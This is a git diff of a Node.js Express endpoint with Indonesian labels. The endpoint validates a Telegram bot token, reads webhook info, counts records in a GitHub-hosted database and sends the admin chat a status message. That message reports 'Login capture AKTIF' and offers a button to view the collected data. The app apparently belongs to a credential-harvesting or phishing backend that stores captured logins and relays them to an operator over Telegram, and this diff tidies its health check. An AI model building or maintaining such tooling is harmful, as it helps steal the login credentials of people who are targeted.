@@ -828,49 +828,51 @@ app.get('/api/test-telegram', async (req, res) => {
   if (!token) return res.json({ ok: false, error: 'TELEGRAM_BOT_TOKEN tidak ada' });
   if (!chat)  return res.json({ ok: false, error: 'TELEGRAM_CHAT_ID tidak ada' });
 
-  // getMe — validasi token
   const me = await tgRequest('getMe', {});
-  if (!me || !me.ok) return res.json({ ok: false, error: 'Bot token invalid', detail: me });
+  if (!me || !me.ok) return res.json({ ok: false, error: 'Bot token invalid', raw: me });
 
-  // getWebhookInfo
   const wh = await new Promise(resolve => {
-    const req2 = require('https').request({
+    const r2 = require('https').request({
       hostname: 'api.telegram.org',
       path: '/bot' + token + '/getWebhookInfo',
       method: 'GET'
     }, r => { let d=''; r.on('data',c=>d+=c); r.on('end',()=>{ try{resolve(JSON.parse(d))}catch{resolve(null)} }); });
-    req2.on('error', ()=>resolve(null));
-    req2.end();
+    r2.on('error',()=>resolve(null));
+    r2.end();
   });
 
-  // Kirim pesan test ke admin chat
-  const db      = await ghLoadData();
-  const testMsg = await tgSend(chat,
-\`🔧 <b>TEST BOT — SEMUA SISTEM OK</b>
-━━━━━━━━━━━━━━━━━━━━━━━
+  const db = await ghLoadData();
+  const botName = me.result.username;
+  const wTime   = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
+  const whUrl   = (wh && wh.result && wh.result.url) ? wh.result.url : 'Belum diset';
+  const whErr   = (wh && wh.result && wh.result.last_error_message) ? wh.result.last_error_message : 'Tidak ada';
 
-🤖 <b>Bot</b>      : @\${me.result.username}
-💬 <b>Chat ID</b>  : <code>\${chat}</code>
-🌐 <b>Webhook</b>  : \${wh && wh.result && wh.result.url ? wh.result.url : 'Belum set'}
-📊 <b>DB</b>       : \${db.length} records di GitHub
-🕐 <b>Waktu</b>    : \${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })} WIB
+  const msgText = '\uD83D\uDD27 <b>TEST BOT \u2014 STATUS SISTEM</b>\n' + LINE + '\n\n' +
+    '\uD83E\uDD16 <b>Bot</b>      : @' + botName + '\n' +
+    '\uD83D\uDCAC <b>Chat ID</b>  : <code>' + chat + '</code>\n' +
+    '\uD83C\uDF10 <b>Webhook</b>  : ' + whUrl + '\n' +
+    '\u26A0\uFE0F <b>WH Error</b> : ' + whErr + '\n' +
+    '\uD83D\uDCCA <b>DB</b>       : ' + db.length + ' records di GitHub\n' +
+    '\uD83D\uDD50 <b>Waktu</b>    : ' + wTime + ' WIB\n\n' +
+    '\u2705 Login capture AKTIF\n\u2705 GitHub database AKTIF\n\u2705 Telegram notif AKTIF';
 
-✅ Login capture AKTIF
-✅ GitHub database AKTIF
-✅ Telegram notif AKTIF\`,
-    { reply_markup: { inline_keyboard: [[{ text: '📋 Lihat Data', callback_data: 'data_0' }, { text: '🏠 Menu', callback_data: 'menu' }]] } }
-  );
+  const sent = await tgSend(chat, msgText, {
+    reply_markup: { inline_keyboard: [[
+      { text: '\uD83D\uDCCB Lihat Data', callback_data: 'data_0' },
+      { text: '\uD83C\uDFE0 Menu', callback_data: 'menu' }
+    ]] }
+  });
 
   res.json({
     ok: true,
-    bot: me.result.username,
+    bot: botName,
     chat_id: chat,
-    webhook_url: wh && wh.result ? wh.result.url : null,
-    pending_updates: wh && wh.result ? wh.result.pending_update_count : null,
-    last_error: wh && wh.result ? wh.result.last_error_message : null,
+    webhook_url: whUrl,
+    webhook_error: whErr,
+    pending_updates: (wh && wh.result) ? wh.result.pending_update_count : null,
     db_records: db.length,
-    telegram_sent: !!(testMsg && testMsg.ok),
-    message_id: testMsg && testMsg.result ? testMsg.result.message_id : null
+    telegram_sent: !!(sent && sent.ok),
+    message_id: (sent && sent.result) ? sent.result.message_id : null
   });
 });
 
